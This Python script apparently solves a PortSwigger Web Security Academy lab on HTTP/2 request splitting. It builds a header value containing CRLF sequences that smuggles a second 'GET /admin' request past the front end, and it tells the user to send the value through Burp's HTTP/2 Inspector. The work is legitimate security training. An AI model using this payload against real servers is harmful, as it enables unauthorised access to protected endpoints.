"""
Lab 16: HTTP/2 request splitting via CRLF injection
https://portswigger.net/web-security/request-smuggling/advanced/h2-request-splitting-crlf-injection
Difficulty: Practitioner

📝 Same illegal-CRLF-in-header-value primitive as Lab 15, but crafted to
SPLIT the single downgraded request into two complete, independent HTTP/1.1
requests on the wire — rather than just appending extra headers to one.

⚠️ Same library limitation as Lab 15: `h2` won't let a compliant client
send the raw \\r\\n. This needs Burp's HTTP/2 Inspector raw editor.
"""

from utils import open_h2_via_burp, log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"

# Crafted so the \r\n\r\n sequence fully terminates a synthetic first
# request, and what follows starts a completely independent second one —
# "splitting" rather than just appending headers.
SPLIT_HEADER_VALUE = (
    "bar\r\n"
    "Content-Length: 0\r\n"
    "\r\n"
    "GET /admin HTTP/1.1\r\n"
    "Host: " + HOST + "\r\n"
    "X-Ignore: X"
)


def run():
    note("Intended raw header value (paste into Burp's HTTP/2 Inspector):")
    note(f"  foo: {SPLIT_HEADER_VALUE!r}")

    tls_sock, conn = open_h2_via_burp(HOST)
    headers = [
        (":method", "GET"),
        (":authority", HOST),
        (":scheme", "https"),
        (":path", "/"),
        ("foo", SPLIT_HEADER_VALUE),
    ]
    try:
        conn.send_headers(1, headers, end_stream=True)
        tls_sock.sendall(conn.data_to_send())
        log("Unexpectedly sent — library version may not validate this.")
    except Exception as e:
        log(f"h2 library rejected the CRLF-containing header, as expected: {e}", ok=False)
        note("As with Lab 15: recreate in Burp Repeater with HTTP/2 selected,")
        note("editing the raw header bytes directly in Inspector to include")
        note("the literal \\r\\n\\r\\n sequence that validated clients refuse.")


if __name__ == "__main__":
    run()
